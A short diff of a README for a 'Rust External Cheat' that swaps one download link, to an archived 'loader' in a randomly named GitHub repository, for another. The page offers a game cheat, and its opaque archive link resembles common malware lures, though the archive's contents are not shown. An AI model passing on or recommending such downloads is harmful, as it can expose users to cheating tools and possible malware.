@@ -1,6 +1,6 @@
 # Rust External Cheat
 
-* [Download](https://github.com/Outlookhub67/bug-free-octo-pancake/releases/download/Release/RustLoader.rar)
+* [Download](https://github.com/Outlookhub67/bug-free-octo-pancake/releases/download/Release/Loader.rar)
 
 # Information 
 
